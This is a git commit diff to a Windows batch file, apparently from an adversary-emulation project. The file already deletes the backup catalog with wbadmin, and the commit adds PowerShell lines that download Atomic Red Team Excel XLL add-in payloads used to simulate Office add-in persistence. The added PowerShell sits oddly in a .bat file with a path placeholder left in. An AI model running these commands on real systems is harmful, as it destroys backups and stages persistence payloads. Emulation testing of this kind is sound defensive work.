60bd64ba244bd8a74b92c0309e141b32509c347b
abelathur <a.belathur@outlook.com>
2023-05-24 11:47:16 +0530

    fix: modified batch files(3)

--- public/batch/impactWin.bat
+++ public/batch/impactWin.bat
@@ -5,3 +5,6 @@ cmd.exe /C wbadmin delete catalog -quiet
 calc
 start notepad
 start chrome
+New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
+Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
+Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"
